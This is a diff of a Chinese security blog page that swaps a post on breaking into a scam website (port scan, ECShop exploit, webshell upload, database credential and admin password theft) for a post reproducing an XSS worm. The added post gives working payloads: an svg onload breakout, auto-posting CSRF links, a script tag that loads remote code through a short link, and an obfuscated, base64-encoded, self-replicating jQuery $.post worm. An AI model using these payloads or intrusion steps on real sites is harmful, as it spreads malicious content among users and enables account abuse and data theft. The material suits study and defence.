@@ -15,11 +15,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          诈骗网站渗透取证 - 明心 | Blog
+          XSS 蠕虫攻击 - 明心 | Blog
         
     </title>
 
-    <link rel="canonical" href="http://www.mingxin.live/article/诈骗网站渗透取证/">
+    <link rel="canonical" href="http://www.mingxin.live/article/XSS-蠕虫攻击/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -72,7 +72,7 @@
 <style type="text/css">
     header.intro-header{
         
-            background-image: url('/img/article_header/8.jpg')
+            background-image: url('/img/article_header/1.jpg')
             /*post*/
         
     }
@@ -93,14 +93,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
+                              <a class="tag" href="/tags/#漏洞复现" title="漏洞复现">漏洞复现</a>
                             
                         </div>
-                        <h1>诈骗网站渗透取证</h1>
-                        <h2 class="subheading">通过实战诈骗网站渗透的案例，增强实战经验</h2>
+                        <h1>XSS 蠕虫攻击</h1>
+                        <h2 class="subheading">XSS 蠕虫攻击</h2>
                         <span class="meta">
                             Posted by 明心 on
-                            2019-05-07
+                            2019-06-11
                         </span>
                     </div>
                 
@@ -217,60 +217,96 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="诈骗网站渗透取证">诈骗网站渗透取证</h1>
+                <h1 id="xss-蠕虫攻击">XSS 蠕虫攻击</h1>
 <h2 id="一前言">一：前言</h2>
-<p>通过实战诈骗网站渗透的案例，增强实战经验</p>
-<p>这次实战攻占诈骗网站，进行信息收集，扫描端口发现对方可利用的端口中只开放了80端口，所以只能通过80端口渗透目标主机</p>
-<h2 id="二渗透过程">二：渗透过程</h2>
-<h3 id="1信息搜集">1：信息搜集</h3>
-<p>nmap对目标主机进行扫描，扫描结果如下：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/1.jpg" alt=""></p>
-<p>可以看到目标主机只有80端口开放，因此只能从80端口渗透目标主机，访问目标服务器的80端口，显示界面如下：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/2.jpg" alt=""></p>
-<p>界面做的很仿真，通过浏览网站，发现网站的大多功能都的跳转到真实的网站地址，只有这个红色的<font color="red"><code>专案执行令</code> </font> 不会跳转到其他服务器，点击<font color="red"><code>专案执行令</code> </font> 进入页面：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/4.jpg" alt=""></p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/5.jpg" alt=""></p>
-<p>可以看到页面有一个表单，提示输入<code>专案验证码</code> 和 <code>涉案嫌疑人证号</code> ，可以知悉其存储了受害人的信息，左上角有一个<code>网上安全监控软件-犯罪追查系统</code>，点击自动开始下载<code>TeamView</code>远程监控软件，目的是通过诱骗等等方式控制受害人电脑进行远程转帐等操作</p>
-<p><strong>分析：</strong></p>
-<p>这里在前台可以在该表单查询受害人信息，那么一定有个后台用于管理受害人信息，执行增删检查操作</p>
-<p>进行敏感目录扫描：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/6.jpg" alt=""></p>
-<p>看到<code>admin</code>眼前一亮，在原目标域名后添加<code>/admin</code>访问之，网页自动跳转到其后台登陆界面：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/7.jpg" alt=""></p>
-<p>可以看到该后台使用的是<code>ECShop CMS</code>系统，右键查看源代码，点击这个JS连接<code>js/validator.js</code>：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/8.jpg" alt=""></p>
-<p>可以看到该CMS确实是ECShop，并且版本可能为1.1</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/9.jpg" alt=""></p>
-<h3 id="2漏洞利用写入webshell">2：漏洞利用，写入webshell</h3>
-<p>确定其CMS有什么用呢？一般的思路如下：</p>
+<p>XSS蠕虫（跨站点脚本蠕虫）是一种跨站病毒，通常由脚本语言的JavaScript写成，它借由网站访问者传播。</p>
+<p>实现XSS蠕虫攻击的关键在于如何利用XSS漏洞蠕虫攻击，一般利用存储型的XSS来进行蠕虫攻击，但也可利用反射型的XSS结合csrf漏洞同样可以造成蠕虫攻击。</p>
+<p>例如：构造一个反射型XSS的url，通过钓鱼链接（或其他方法）发送给受害者诱使其点击，而payload引用写好的可以蠕虫的JS，JS要有转发该payload的功能，也可以结合CSRF完成恶意操作（如加关注，转发等）。当存储型的XSS漏洞与CSRF漏洞结合时，将会造成严重的危害，如在社交网站一个存储型XSS可以通过引用存在CSRF漏洞的链接，不需要构建JS代码，便可以轻松完成蠕虫的效果。</p>
+<h2 id="二xss蠕虫攻击复现">二：XSS蠕虫攻击复现</h2>
+<h3 id="1发现xss漏洞">1：发现XSS漏洞</h3>
+<p>在注册账号之后，首先来到论坛的发表帖子的地方，提交内容可以看到帖子主题名限制输入长度，为2到64个字节，而且通过post参数提交帖子主题名和内容。</p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/1.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/2.jpg" alt=""></p>
+<p>尝试<code>title</code>参数进行XSSpayload批量测试，发现网站限制发帖有时间限制，不能在30秒内重发发帖，手工测试payload，查看元素发现输入内容包含在<code>div</code>标签内，闭合后使用svg标签，payload为：<code>bbbb”&gt;&lt;svg/onload=alert(1)&gt;</code>，主题名处的payload被解析执行了。</p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/3.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/4.jpg" alt=""></p>
+<h3 id="2构建蠕虫">2：构建蠕虫</h3>
+<p>先定义两个概念：</p>
 <ul>
-<li>Google找到其对应版本的已知漏洞或exp，进行利用</li>
-<li>下载其CMS源码，审计或者分析源码</li>
+<li>
+<p>母贴：母贴为攻击者最先发布的具有蠕虫功能的帖子或者评论或者留言等</p>
+</li>
+<li>
+<p>字帖：被母贴感染后用户自动发送的贴子或者评论或者留言等</p>
+</li>
 </ul>
-<p>在网上找了半天没有找到ECShop 有V1.1版本，大多数都为V2.7.3版本，下载解压后，进入程序目录<code>upload</code> 可以看到<code>api</code> 目录，在域名后跟<code>api</code> 访问之后发现，网站直接把目录里的文件显示出来了</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/10.jpg" alt=""></p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/11.jpg" alt=""></p>
-<p>看到这里就方便很多了，说明该CMS的确为ECShop ，而且很可能就是V2.7.3版本</p>
-<p>找到对应的CMS，即可按图索骥，寻找合适的exp，下面的网址都有对应的EXP修改后自行利用即可</p>
+<p>蠕虫的关键是子贴的内容，子贴的内容必须是可控的才能造成蠕虫</p>
+<h4 id="21如何蠕虫思路分析结合靶机">2.1：如何蠕虫（思路分析，结合靶机）</h4>
+<p>在查看了前辈们利用蠕虫攻击的方式后，我总结了两种方法，这里分别用两种方式实验</p>
+<p><strong>（1）：XSS结合CSRF</strong></p>
+<p>①：首先找到内容可以控制的且存在CSRF漏洞的地方，如留言板、评论处、提问处、发帖处等</p>
+<p>操作如下：</p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/5.jpg" alt=""></p>
+<p>更改为GET请求：</p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/6.jpg" alt=""></p>
+<p>只要站内用户访问下面链接，将自动发送主题名和内容为“1111231231313”的帖子</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:/192.168.11.**/post.php?action=save&amp;fid=2&amp;cmd=topic&amp;topictype=0&amp;title=1111231231313&amp;content=11121313213213213%0D%0A</span><br></pre></td></tr></table></figure>
+<p>②：将该CSRF链接插入到XSS中，结合两者，构造payload。如通过img标签或a标签等引用CSRF的链接，若CSRF链接够长还可缩短成短链接的形式（百度有）。</p>
+<p>操作如下：</p>
+<p>将上面的CSRF连接生成短链接：<a href="http://u6.gg/sE7MH" target="_blank" rel="noopener">http://u6.gg/sE7MH</a></p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/7.jpg" alt=""></p>
+<p>然后插入到XSS payload中：<code>bb&quot;&lt;script src=http://u6.gg/sE7MH&gt;&lt;/script&gt;</code></p>
+<p>③：然后将②构造的payload插入CSRF中，构造成新的具有蠕虫功能的CSRF链接。那怎么插呢？既然CSRF参数可控，直接将该payload赋值给可控参数，新的具有蠕虫功能的CSRF链接就构造好了，因为一旦该链接触发，将会执行原CSRF链接的功能（留言或评论等），而留言或评论的内容将又是XSS和CSRF结合的 payload。</p>
+<p>操作如下：</p>
+<p>将XSS和CSRF结合的payload复制给CSRF的可控参数title和content</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:/192.168.11.**/post.php?action=save&amp;fid=2&amp;cmd=topic&amp;topictype=0&amp;title=bb&quot;&lt;script src=http://u6.gg/sE7MH&gt;&lt;/script&gt;&amp;content=bb&quot;&lt;script src=http://u6.gg/sE7MH&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>④：将上面具有蠕虫功能的CSRF链接再次引用或插入到XSS payload中，如果链接过长，可以将链接缩短，缩成短链接的形式（百度有）。插入到XSS payload后，如果是存储型XSS，只要触发这个XSS就会触发XSRF，而XSRF又插入了XSS，而XSS又插入了CSRF的链接，反反复复，形成蠕虫。</p>
+<p>操作如下：</p>
+<p>将上面构造的CSRF链接生成短链接：<a href="http://u6.gg/sE7NL" target="_blank" rel="noopener">http://u6.gg/sE7NL</a></p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/8.jpg" alt=""></p>
+<p>将生成的短链接引入XSS payload中：<code>bb&quot;&lt;script src=http://u6.gg/sE7NL&gt;&lt;/script&gt;</code></p>
+<p>这时只需要在存在XSS漏洞的地方执行此payload便可以造成蠕虫</p>
+<p><strong>（2）：编写具有蠕虫功能的JS，通过XSS引用执行JS，实现JS代码构造的功能</strong></p>
+<p>①：通过查看元素看网络传输，发现该网站是通过jQuery来加载JS的，确定是jQuery，可以很方便的利用jquery构造payload。</p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/9.jpg" alt=""></p>
+<p>②：编写JS脚本，而JS脚本的功能要有：</p>
 <ul>
-<li><a href="http://paper.tuisec.win/detail/ab2df26cb395c70" target="_blank" rel="noopener">http://paper.tuisec.win/detail/ab2df26cb395c70</a></li>
-<li><a href="http://paper.tuisec.win/detail/5f427506f4635da" target="_blank" rel="noopener">http://paper.tuisec.win/detail/5f427506f4635da</a></li>
-<li><a href="https://www.cnblogs.com/68xi/p/9327620.html" target="_blank" rel="noopener">https://www.cnblogs.com/68xi/p/9327620.html</a></li>
+<li>
+<p>创建一个子帖</p>
+</li>
+<li>
+<p>子帖的内容是重新创建一个子贴，而子贴创建的子贴的内容又是重新创建一个子贴，实现蠕虫</p>
+</li>
 </ul>
-<p>利用EXP上传一句话木马，这里是在api目录下上传的<code>gooos.php</code></p>
-<h3 id="3shell连接查看数据库">3：shell连接，查看数据库</h3>
-<p>使用菜刀连接</p>
-<p>找到数据库的配置文件，查看数据库用户名和密码：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/12.jpg" alt=""></p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/13.jpg" alt=""></p>
-<p>得到数据库的帐号密码之后进入数据库查看后台信息，查看管理员信息表如图：</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/14.jpg" alt=""></p>
-<p>在线CMD 5查询了admin2的密码，查询结果为：admin88888</p>
-<p>（为什么不查admin，因为要购买，没钱）</p>
-<h3 id="4拿下管理员账户后台登录">4：拿下管理员账户，后台登录</h3>
-<p>直接在之前找到的后台地址登陆，用户名为<code>admin2</code> ，密码为<code>admin88888</code></p>
-<p>登陆之后，查看“犯罪通缉人列表”（受害者列表），受害者有上千人，渗透到此，取证完毕~</p>
-<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/15.jpg" alt=""></p>
+<p>JS代码为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.post(&quot;/post.php?action=save&amp;fid=2&amp;cmd=topic&amp;topictype=0&quot;,&#123; title: &quot;&lt;svg/onload=eval(atob(jQuery(&apos;.content:first&apos;).html()))&gt;&quot;, content: &quot;JC5wb3N0KCIvcG9zdC5waHA/YWN0aW9uPXNhdmUmZmlkPTImY21kPXRvcGljJnRvcGljdHlwZT0wIix7IHRpdGxlOiAieHNzIHdvcm08c3ZnL29ubG9hZD1ldmFsKGF0b2IoalF1ZXJ5KCcuY29udGVudDpmaXJzdCcpLmh0bWwoKSkpPiIsIGNvbnRlbnQ6ICIiIH0pOw==&quot; &#125;)</span><br></pre></td></tr></table></figure>
+<p>来分析一下这段代码</p>
+<p>可以明显看到post请求数据，然后<code>title</code>和<code>content</code>的值以字典形式发送。<code>title</code>的值为一个svg标签，<code>jQuery(&quot;.content:first&quot;).html())</code>即可获得当前帖子的内容，贴子内容也就是<code>content</code>的值为<code>&quot;JC5wb3N0KCIvcG9zdC5waHA/YWN0aW9uPXNhdmUmZmlkPTImY21kPXRvcGljJnRvcGljdHlwZT0wIix7IHRpdGxlOiAieHNzIHdvcm08c3ZnL29ubG9hZD1ldmFsKGF0b2IoalF1ZXJ5KCcuY29udGVudDpmaXJzdCcpLmh0bWwoKSkpPiIsIGNvbnRlbnQ6ICIiIH0pOw==&quot;</code>该内容是通过base64加密的，所以在svg标签内通过eval解码</p>
+<p>将<code>content</code>的值解密后为：</p>
+<p><code>$.post(&quot;/post.php?action=save&amp;fid=2&amp;cmd=topic&amp;topictype=0&quot;,{ title: &quot;xss worm&lt;svg/onload=eval(atob(jQuery('.content:first').html()))&gt;&quot;, content: &quot;&quot; });</code></p>
+<p>很明显该内容又会再次创建一个子贴</p>
+<p>将设计好的JS代码base64编码，这样内容部分的payload就完成了。如下：</p>
+<p><code>JC5wb3N0KCIvcG9zdC5waHA/YWN0aW9uPXNhdmUmZmlkPTImY21kPXRvcGljJnRvcGljdHlwZT0wIix7IHRpdGxlOiAiPHN2Zy9vbmxvYWQ9ZXZhbChhdG9iKGpRdWVyeSgnLmNvbnRlbnQ6Zmlyc3QnKS5odG1sKCkpKT4iLCBjb250ZW50OiAiSkM1d2IzTjBLQ0l2Y0c5emRDNXdhSEEvWVdOMGFXOXVQWE5oZG1VbVptbGtQVEltWTIxa1BYUnZjR2xqSm5SdmNHbGpkSGx3WlQwd0lpeDdJSFJwZEd4bE9pQWllSE56SUhkdmNtMDhjM1puTDI5dWJHOWhaRDFsZG1Gc0tHRjBiMklvYWxGMVpYSjVLQ2N1WTI5dWRHVnVkRHBtYVhKemRDY3BMbWgwYld3b0tTa3BQaUlzSUdOdmJuUmxiblE2SUNJaUlIMHBPdz09IiB9KQ==</code></p>
+<p>②：JS写好了，需要XSS引用去执行它</p>
+<p>这里的XSS地方是贴子的主题，来引用帖子内容写的JS脚本</p>
+<p>payload为：<code>XSS WORM&lt;svg/onload=eval(atob(jQuery(&quot;.content:first&quot;).html()))&gt;</code></p>
+<p><code>XSS WORM</code>是母帖主题名内容，然后通过svg标签中的 onload事件执行写在内容里的JS脚本，触发蠕虫。</p>
+<p>当攻击者发布母贴后，查看后首先会自己触发蠕虫，再次转发：</p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/10.jpg" alt=""></p>
+<p>截图可以看到子贴的内容均为：如下内容base64编码后的结果</p>
+<p><code>$.post(&quot;/post.php?action=save&amp;fid=2&amp;cmd=topic&amp;topictype=0&quot;,{ title: &quot;xss worm&lt;svg/onload=eval(atob(jQuery('.content:first').html()))&gt;&quot;, content: &quot;&quot; });</code></p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/11.jpg" alt=""></p>
+<p>当我以另外一个用户身份登陆查看时，触发该蠕虫自动转发：</p>
+<p><img src="//mingxin.live/img/Struts2-016/XSS%E8%A0%95%E8%99%AB/12.jpg" alt=""></p>
+<h4 id="22相关参考链接和拓展阅读">2.2：相关参考链接和拓展阅读</h4>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2014-088810.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2014-088810.html</a>（中国移动微博存储型XSS 可蠕虫(附蠕虫POC)）</p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2014-072627.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2014-072627.html</a>（ 中国电信天翼云网盘高危XSS可蠕虫）</p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2014-072627.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2014-072627.html</a>（赶集网主站存储型XSS结合蠕虫）</p>
+<p><a href="https://www.freebuf.com/articles/network/190392.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/network/190392.html</a></p>
+<p><a href="http://www.anquan.us/static/bugs/wooyun-2014-073160.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2014-073160.html</a>（万达电影主站 xss + csrf 蠕虫）</p>
+<h3 id="3总结">3：总结</h3>
+<p>XSS的漏洞比较常见，但由于其危害较小，很难直接getshell，容易被忽略。但利用的方法有很多，只要结合CSRF，就能发挥出不一样的威力。即便是最废的“自插型”XSS结合CSRF漏洞，也有可能进行蠕虫。</p>
+<p>（参考链接：<a href="http://www.anquan.us/static/bugs/wooyun-2015-089852.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2015-089852.html</a>）</p>
 
                 
 
@@ -278,13 +314,9 @@
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/article/XSS-蠕虫攻击/" data-toggle="tooltip" data-placement="top" title="XSS 蠕虫攻击">&larr; Previous Post</a>
-                        </li>
-                    
                     
                         <li class="next">
-                            <a href="/article/Struts2-016命令执行漏洞/" data-toggle="tooltip" data-placement="top" title="Struts2-016命令执行漏洞">Next Post &rarr;</a>
+                            <a href="/article/诈骗网站渗透取证/" data-toggle="tooltip" data-placement="top" title="诈骗网站渗透取证">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -334,7 +366,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#诈骗网站渗透取证"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x8BC8;&#x9A97;&#x7F51;&#x7AD9;&#x6E17;&#x900F;&#x53D6;&#x8BC1;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#一前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x4E00;&#xFF1A;&#x524D;&#x8A00;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二渗透过程"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x4E8C;&#xFF1A;&#x6E17;&#x900F;&#x8FC7;&#x7A0B;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1信息搜集"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">1&#xFF1A;&#x4FE1;&#x606F;&#x641C;&#x96C6;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2漏洞利用写入webshell"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">2&#xFF1A;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#xFF0C;&#x5199;&#x5165;webshell</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#3shell连接查看数据库"><span class="toc-nav-number">1.2.3.</span> <span class="toc-nav-text">3&#xFF1A;shell&#x8FDE;&#x63A5;&#xFF0C;&#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#4拿下管理员账户后台登录"><span class="toc-nav-number">1.2.4.</span> <span class="toc-nav-text">4&#xFF1A;&#x62FF;&#x4E0B;&#x7BA1;&#x7406;&#x5458;&#x8D26;&#x6237;&#xFF0C;&#x540E;&#x53F0;&#x767B;&#x5F55;</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#xss-蠕虫攻击"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">XSS &#x8815;&#x866B;&#x653B;&#x51FB;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#一前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x4E00;&#xFF1A;&#x524D;&#x8A00;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二xss蠕虫攻击复现"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x4E8C;&#xFF1A;XSS&#x8815;&#x866B;&#x653B;&#x51FB;&#x590D;&#x73B0;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1发现xss漏洞"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">1&#xFF1A;&#x53D1;&#x73B0;XSS&#x6F0F;&#x6D1E;</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#2构建蠕虫"><span class="toc-nav-number">1.2.2.</span> <span class="toc-nav-text">2&#xFF1A;&#x6784;&#x5EFA;&#x8815;&#x866B;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#21如何蠕虫思路分析结合靶机"><span class="toc-nav-number">1.2.2.1.</span> <span class="toc-nav-text">2.1&#xFF1A;&#x5982;&#x4F55;&#x8815;&#x866B;&#xFF08;&#x601D;&#x8DEF;&#x5206;&#x6790;&#xFF0C;&#x7ED3;&#x5408;&#x9776;&#x673A;&#xFF09;</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#22相关参考链接和拓展阅读"><span class="toc-nav-number">1.2.2.2.</span> <span class="toc-nav-text">2.2&#xFF1A;&#x76F8;&#x5173;&#x53C2;&#x8003;&#x94FE;&#x63A5;&#x548C;&#x62D3;&#x5C55;&#x9605;&#x8BFB;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#3总结"><span class="toc-nav-number">1.2.3.</span> <span class="toc-nav-text">3&#xFF1A;&#x603B;&#x7ED3;</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -354,7 +386,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
+                          <a class="tag" href="/tags/#漏洞复现" title="漏洞复现">漏洞复现</a>
                         
                     </div>
                 </section>
